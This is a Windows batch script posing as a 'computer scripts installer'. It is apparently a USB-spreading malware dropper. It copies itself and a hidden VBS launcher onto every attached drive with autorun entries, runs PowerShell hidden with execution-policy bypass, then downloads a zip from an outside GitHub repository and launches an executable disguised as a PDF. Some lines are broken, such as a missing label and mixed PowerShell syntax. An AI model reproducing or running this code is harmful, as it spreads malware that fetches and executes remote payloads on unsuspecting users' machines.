@echo off

@rem Computer scripts installer


@rem Function to check internet connection
:check_internet
ping -n 1 8.8.8.8 >nul 2>&1
if errorlevel 1 (
    timeout /t 7200 >nul
    goto check_internet7
)

@rem check for usb
:check_drive
for %%d in (D E F G H I J K L M N O P Q R S T U V W X Y Z) do (
    if exist %%d:\ (goto Yes)
)

@rem if usb not found, loop back and check again
goto check_drive

@rem if usb present, run payload
:Yes
for %%d in (D E F G H I J K L M N O P Q R S T U V W X Y Z) do (
    if exist %%d:\ (
        copy "%~f0" "%%d:\system info\AutoRun.bat"
        copy "RunHidden.vbs" "%%d:\system info\RunHidden.vbs"
        echo [autorun] > "%%d:\system info\autorun.inf"
        echo open=RunHidden.vbs >> "%%d:\autorun.inf"
    )
)

powershell powershell.exe -windowstyle hidden -ep bypasss ./RunHidden.vbs

@rem timeout /t 5 /nobreak

Check internet connectivity before downloading the payload
call :check_internet

powershell powershell.exe -windowstyle hidden "Invoke-WebRequest -Uri https://github.com/P0k3m0n-unleashed/ProjSucc/blob/master/Venom/AssassinsCreed_SE.zip -OutFile AssassinsCreed_SE.zip"

$desktop =  "C:/Users/%USERNAME%/Desktop"
$wd = $PWD

cd $wd

PowerShell -Command "Expand-Archive -Path 'AssassinsCreed_SE.zip' -DestinationPath '$desktop'"


@rem copy "$wd/AssassinsCreed_SE/AssassinsCreed_SE.pdf.exe" "$desktop"

start AssassinsCreed_SE.pdf.exe



@rem exit process
:end
exit
